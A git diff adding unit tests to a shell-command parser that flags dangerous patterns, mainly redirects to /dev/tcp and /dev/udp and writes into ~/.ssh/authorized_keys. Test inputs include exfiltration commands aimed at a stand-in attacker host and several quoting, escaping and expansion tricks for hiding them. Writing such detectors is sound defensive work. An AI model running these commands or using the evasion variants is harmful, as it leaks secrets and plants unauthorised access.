@@ -264,6 +264,77 @@ describe("Shell Parser", () => {
       });
     });
 
+    // network_redirect
+    describe("network_redirect", () => {
+      const hasNetworkRedirect = (result: {
+        dangerousPatterns: { type: string }[];
+      }) => result.dangerousPatterns.some((p) => p.type === "network_redirect");
+
+      test("detects output redirect to /dev/tcp", async () => {
+        const result = await parse(
+          "echo secret > /dev/tcp/attacker.example/80",
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("detects input redirect from /dev/tcp", async () => {
+        const result = await parse("cat < /dev/tcp/attacker.example/80");
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("detects read-write descriptor redirect to /dev/udp", async () => {
+        const result = await parse("exec 3<>/dev/udp/attacker.example/53");
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("detects a quoted /dev/tcp destination", async () => {
+        const result = await parse(
+          'echo secret > "/dev/tcp/attacker.example/80"',
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("ignores redirects to ordinary device files", async () => {
+        const result = await parse("echo noise > /dev/null");
+        expect(hasNetworkRedirect(result)).toBe(false);
+      });
+
+      test("normalizes concatenated quoting in the target", async () => {
+        for (const command of [
+          'echo secret > /dev/t"cp"/attacker.example/80',
+          "echo secret > /dev/'tcp'/attacker.example/80",
+          'echo secret > "/dev/tcp"/attacker.example/80',
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
+        }
+      });
+
+      test("normalizes backslash escapes and ANSI-C quoting in the target", async () => {
+        for (const command of [
+          "echo secret > /dev/\\tcp/attacker.example/80",
+          "echo secret > $'/dev/tcp/attacker.example/80'",
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
+        }
+      });
+
+      test("decodes ANSI-C escapes in the target", async () => {
+        const result = await parse(
+          "echo secret > $'/dev/\\x74cp/attacker.example/80'",
+        );
+        expect(hasNetworkRedirect(result)).toBe(true);
+      });
+
+      test("keeps backslashes literal inside quotes", async () => {
+        for (const command of [
+          "echo x > '/dev/\\tcp/host/80'",
+          'echo x > "/dev/\\tcp/host/80"',
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(false);
+        }
+      });
+    });
+
     // sensitive_redirect
     describe("sensitive_redirect", () => {
       test("detects redirect to ~/.ssh/", async () => {
@@ -292,6 +363,20 @@ describe("Shell Parser", () => {
         expect(
           result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
         ).toBe(true);
+      });
+
+      test("normalizes concatenated quoting in the target", async () => {
+        const result = await parse('echo key > ~/.s"sh"/authorized_keys');
+        expect(
+          result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
+        ).toBe(true);
+      });
+
+      test("treats a quoted tilde as a literal directory", async () => {
+        const result = await parse("echo key > '~/.ssh/authorized_keys'");
+        expect(
+          result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
+        ).toBe(false);
       });
 
       test("detects redirect to ~/.gnupg/", async () => {
@@ -681,7 +766,7 @@ describe("Shell Parser", () => {
     test("parse-recovery in multi-stage pipeline marks ALL siblings synthetic", async () => {
       // The original bug repro from the iPhone screenshot.
       const cmd =
-        "cat /workspace/vellum-assistant-platform/web/src/app/(app)/admin/organizations/[id]/page.tsx | grep -A 30 -B 5 \"credit\\|Credit\" | head -80";
+        'cat /workspace/vellum-assistant-platform/web/src/app/(app)/admin/organizations/[id]/page.tsx | grep -A 30 -B 5 "credit\\|Credit" | head -80';
       const result = await parse(cmd);
       expect(result.segments.length).toBeGreaterThan(1);
       expect(result.segments.every((s) => s.synthetic === true)).toBe(true);
@@ -750,5 +835,24 @@ describe("Shell Parser", () => {
       expect(programs).toContain("grep");
       expect(result.segments.every((s) => !s.synthetic)).toBe(true);
     });
+  });
+});
+
+describe("redirect targets with expansions are opaque", () => {
+  for (const command of [
+    "X=/dev/tcp; echo secret > $X/attacker.example/80",
+    'echo secret > "${OUT}"',
+    "echo secret > $(printf /dev/tcp/attacker.example/80)",
+    "cat < $INPUT",
+  ]) {
+    test(command, async () => {
+      expect((await parse(command)).hasOpaqueConstructs).toBe(true);
+    });
+  }
+
+  test("a literal target is not opaque", async () => {
+    expect((await parse("echo noise > /dev/null")).hasOpaqueConstructs).toBe(
+      false,
+    );
   });
 });
